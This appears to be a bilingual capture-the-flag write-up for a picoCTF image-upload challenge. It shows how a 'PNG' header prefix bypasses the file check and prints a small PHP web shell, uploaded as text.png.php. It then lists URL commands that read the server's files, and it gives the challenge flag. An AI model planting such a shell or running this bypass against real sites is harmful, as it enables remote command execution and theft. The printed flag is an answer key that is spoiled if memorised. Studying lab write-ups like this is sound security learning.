## Descripción
I found a web app that can help process images: PNG images only! Additional details will be available after launching your challenge instance.

Encontré una aplicación web que puede ayudar a procesar imágenes: ¡solo imágenes PNG! Los detalles adicionales estarán disponibles después de iniciar tu instancia de desafío.
## Solución
La pagina valida si un archivo es PNG, si por ejemplo intentamos subir un archivo `.txt`llamado `text.png`nos indica que no es un archivo PNG, pero si al inicio de texto ponemos `PNG` si lo admite, por lo que podemos usar esta vulnerabilidad. Usando `bloc de notas`de Windows creamos un archivo llamado `text.png.php`con el siguiente código:
```php
PNG
<?php
if (isset($_GET['cmd'])){
	system($_GET['cmd']);
}
?>
```
Esto nos permite mandar comandos a la consola de la maquina donde esta la página, si por ejemplo agregamos `/uploads/text.png.php?cmd=ls`al url de la página podemos ver los archivos subidos a la página. Ahora solo buscamos la bandera:
- Con `/uploads/text.png.php?cmd=pwd` salimos de la carpeta y vemos la dirección donde estamos.
- Con `/uploads/text.png.php?cmd=ls ..`podemos ver los archivos en la carpeta actual y ahí encontramos el archivo `GNTDOMBWGIZDE.txt` que es donde se encuentra la bandera.
- Con `/uploads/text.png.php?cmd=cat ../GNTDOMBWGIZDE.txt` podemos leerlo y así ver la bandera: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}`